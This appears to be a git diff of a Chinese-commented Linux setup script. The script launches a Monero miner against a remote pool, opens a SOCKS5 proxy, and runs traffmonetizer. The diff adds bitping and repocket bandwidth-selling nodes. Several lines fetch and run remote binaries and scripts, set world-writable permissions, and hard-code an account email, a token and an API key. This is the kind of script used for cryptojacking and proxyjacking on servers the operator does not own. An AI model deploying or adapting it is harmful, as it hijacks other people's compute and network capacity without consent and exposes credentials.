@@ -17,6 +17,15 @@ chmod 777 ./m416
 screen -dmS xmr
 screen -x -S xmr -p 0 -X stuff "./m416 -o xmr.726726.xyz:3333 --rig-id az -t $(nproc) \n"
 
+# 下载和解压缩 bitping
+wget https://downloads.bitping.com/node/linux.zip
+unzip linux.zip
+cd release
+
+# 启动 bitping
+screen -dmS bitping
+screen -x -S bitping -p 0 -X stuff "./bitping-node-amd64-linux --server \n"
+
 # 安装 gost
 wget https://github.com/go-gost/gost/releases/download/v3.0.0-rc8/gost_3.0.0-rc8_linux_amd64.tar.gz
 tar -xvf gost_3.0.0-rc8_linux_amd64.tar.gz
@@ -29,6 +38,10 @@ nohup gost -L "socks5://${username}:${password}@:18888" &
 curl -L https://raw.githubusercontent.com/spiritLHLS/traffmonetizer-one-click-command-installation/main/tm.sh -o tm.sh
 chmod +x tm.sh
 bash tm.sh -t cJmXItZTN7VZMej72fu4rFIauD9uNHiOIy60gwhZPwM=
+
+# 下载并运行 repocket 脚本
+docker pull repocket/repocket:latest
+docker run --name repocket -e RP_EMAIL=tiancekj@gmail.com -e RP_API_KEY=d04fc5ae-b394-4ec5-a795-2fe768f6a831 -d --restart=always repocket/repocket
 
 # 拉取和运行 proxyrack/pop Docker 镜像
 docker pull proxyrack/pop:latest
